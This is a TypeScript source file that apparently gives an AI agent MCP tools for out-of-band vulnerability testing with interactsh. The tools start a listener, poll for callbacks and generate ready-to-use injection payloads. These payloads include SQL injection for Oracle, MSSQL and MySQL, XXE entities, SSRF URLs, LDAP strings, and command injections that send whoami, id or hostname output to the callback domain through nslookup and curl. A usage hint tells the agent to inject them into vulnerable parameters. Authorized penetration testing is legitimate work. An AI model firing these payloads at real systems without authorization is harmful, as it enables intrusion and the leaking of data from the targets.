/**
 * Out-of-Band (OOB) interaction tools using interactsh.
 *
 * Starts interactsh-client listeners, polls for interactions,
 * and generates category-specific OOB payloads.
 */

import { McpServer } from "@modelcontextprotocol/sdk/server/mcp.js";
import { z } from "zod";
import { runShell } from "../runner.js";
import { randomUUID } from "node:crypto";
import { readFile } from "node:fs/promises";

const GO_BIN = `${process.env.HOME}/go/bin`;
const PATH_ENV = `${GO_BIN}:${process.env.PATH}`;

export function register(server: McpServer): void {
  server.tool(
    "oob_start_listener",
    "Start an interactsh-client listener in the background. Returns the unique OAST domain and session file path for polling interactions later. Side effects: Spawns a background interactsh-client process writing JSON to /tmp.",
    {},
    async () => {
      const id = randomUUID().slice(0, 8);
      const sessionFile = `/tmp/interactsh-${id}.json`;

      // Start interactsh-client in background, writing JSON output to file
      const res = await runShell(
        `PATH=${PATH_ENV} nohup interactsh-client -json -o ${sessionFile} > /tmp/interactsh-${id}.log 2>&1 & echo $!`,
        { timeout: 10 }
      );

      const pid = res.stdout.trim();

      // Wait briefly for interactsh to initialize and print its domain
      await new Promise((resolve) => setTimeout(resolve, 3000));

      // Read the log to extract the OAST domain
      let domain = "";
      try {
        const logContent = await readFile(`/tmp/interactsh-${id}.log`, "utf-8");
        // interactsh-client prints the domain like: [INF] Listing 1 payload for OOB Testing\n[INF] abc123.oast.fun
        const domainMatch = logContent.match(/([a-z0-9]+\.oast\.\w+)/i)
          ?? logContent.match(/([a-z0-9]+\.interact\.sh)/i)
          ?? logContent.match(/([a-z0-9.-]+\.(oast|interact)\.\w+)/i);
        if (domainMatch) {
          domain = domainMatch[1];
        }
      } catch {
        // Log file may not exist yet
      }

      const result = {
        domain: domain || "unknown — check log at /tmp/interactsh-" + id + ".log",
        session_file: sessionFile,
        pid,
        log_file: `/tmp/interactsh-${id}.log`,
      };

      return { content: [{ type: "text" as const, text: JSON.stringify(result, null, 2) }] };
    }
  );

  server.tool(
    "oob_poll_interactions",
    "Read the interactsh JSON output file for new OOB interactions. Returns array of interactions with type, remote_address, raw_request, and timestamp.",
    {
      session_file: z.string().describe("Path to the interactsh JSON output file from oob_start_listener"),
    },
    async ({ session_file }) => {
      let interactions: any[] = [];

      try {
        const content = await readFile(session_file, "utf-8");
        const lines = content.split("\n").filter((l) => l.trim());
        for (const line of lines) {
          try {
            const entry = JSON.parse(line);
            interactions.push({
              type: entry["protocol"] ?? entry["type"] ?? "unknown",
              remote_address: entry["remote-address"] ?? entry["remote_address"] ?? "",
              raw_request: entry["raw-request"] ?? entry["raw_request"] ?? entry["raw-response"] ?? "",
              timestamp: entry["timestamp"] ?? entry["time"] ?? "",
              unique_id: entry["unique-id"] ?? "",
            });
          } catch {
            // Skip malformed lines
          }
        }
      } catch {
        return {
          content: [{
            type: "text" as const,
            text: JSON.stringify({ error: `Could not read session file: ${session_file}`, interactions: [] }, null, 2),
          }],
        };
      }

      const result = {
        total_interactions: interactions.length,
        interactions,
      };

      return { content: [{ type: "text" as const, text: JSON.stringify(result, null, 2) }] };
    }
  );

  server.tool(
    "oob_generate_payload",
    "Generate category-specific out-of-band payloads using an OAST domain. Supports: sqli_oracle, sqli_mssql, sqli_mysql, xxe, ssrf, cmdi, ldap. Returns ready-to-use payload strings.",
    {
      domain: z.string().describe("The OAST domain from oob_start_listener, e.g. abc123.oast.fun"),
      attack_type: z.enum(["sqli_oracle", "sqli_mssql", "sqli_mysql", "xxe", "ssrf", "cmdi", "ldap"])
        .describe("Type of attack payload to generate"),
    },
    async ({ domain, attack_type }) => {
      const payloads: Record<string, string[]> = {
        sqli_oracle: [
          `' UNION SELECT UTL_HTTP.REQUEST('http://${domain}/sqli') FROM dual--`,
          `' UNION SELECT HTTPURITYPE('http://${domain}/sqli').GETCLOB() FROM dual--`,
          `'||(SELECT UTL_INADDR.GET_HOST_ADDRESS('${domain}'))||'`,
          `' AND 1=UTL_HTTP.REQUEST('http://${domain}/'||(SELECT user FROM dual))--`,
        ],
        sqli_mssql: [
          `'; EXEC master..xp_dirtree '\\\\${domain}\\sqli'--`,
          `'; EXEC master..xp_subdirs '\\\\${domain}\\sqli'--`,
          `'; DECLARE @q VARCHAR(1024); SET @q='\\\\${domain}\\'+(SELECT system_user); EXEC master..xp_dirtree @q--`,
          `' UNION SELECT 1; EXEC xp_fileexist '\\\\${domain}\\sqli'--`,
        ],
        sqli_mysql: [
          `' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',@@version,'.',${JSON.stringify(domain)},'\\\\sqli'))--`,
          `' AND LOAD_FILE(CONCAT('\\\\\\\\',(SELECT user()),'.',${JSON.stringify(domain)},'\\\\sqli'))--`,
          `SELECT ... INTO OUTFILE '\\\\\\\\${domain}\\\\sqli'`,
        ],
        xxe: [
          `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://${domain}/xxe">]><foo>&xxe;</foo>`,
          `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://${domain}/xxe"> %xxe;]><foo>bar</foo>`,
          `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://${domain}/xxe?data=exfil">]><foo>&xxe;</foo>`,
        ],
        ssrf: [
          `http://${domain}/ssrf`,
          `https://${domain}/ssrf`,
          `http://${domain}/ssrf?url=internal`,
          `gopher://${domain}:70/_ssrf`,
          `dict://${domain}:11111/ssrf`,
        ],
        cmdi: [
          "`nslookup $(whoami)." + domain + "`",
          "$(nslookup $(whoami)." + domain + ")",
          ";nslookup $(whoami)." + domain,
          "|curl http://" + domain + "/cmdi?$(id)",
          "&&curl http://" + domain + "/cmdi?$(hostname)",
          "`curl http://" + domain + "/cmdi?$(cat /etc/hostname)`",
        ],
        ldap: [
          `*)(objectClass=*))%00`,
          `ldap://${domain}/dc=example,dc=com`,
          `${domain}:389`,
        ],
      };

      const result = {
        attack_type,
        domain,
        payloads: payloads[attack_type] ?? [],
        usage_hint: "Inject these payloads into vulnerable parameters, then poll interactions with oob_poll_interactions.",
      };

      return { content: [{ type: "text" as const, text: JSON.stringify(result, null, 2) }] };
    }
  );
}
